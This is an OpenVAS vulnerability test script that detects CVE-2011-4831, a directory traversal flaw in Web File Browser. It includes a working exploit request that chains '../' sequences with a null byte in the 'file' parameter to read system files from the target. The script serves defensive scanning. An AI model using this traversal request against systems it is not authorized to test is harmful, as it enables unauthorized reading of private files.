###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webfilebrowser_file_download_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# Web File Browser 'act' Parameter File Download Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802341");
  script_version("$Revision: 7044 $");
  script_cve_id("CVE-2011-4831");
  script_bugtraq_id(50508);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-11-08 17:09:26 +0530 (Tue, 08 Nov 2011)");
  script_name("Web File Browser 'act' Parameter File Download Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71131");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18070/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50508/exploit");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could allow attackers to download and
  read arbitrary files on the affected application.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Web File Browser versions 0.4b14 and prior");
  script_tag(name : "insight" , value : "The flaw is due to input validation error in 'act' parameter in
  'webFileBrowser.php', which allows attackers to download arbitrary files via a '../'(dot dot) sequences.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running with Web File Browser and is prone to
  file download vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/webFileBrowser", "/webfilebrowser", "/",  cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  sndReq = http_get(item: dir + "/webFileBrowser.php", port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## Confirm application is  NetArt Media Car Portal
  if("<title>Web File Browser" >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = string(dir, "/webFileBrowser.php?act=download&subdir=&sortby=name&file=",
                           crap(data:"../",length:6*9),files[file],"%00");

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url,pattern:file))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);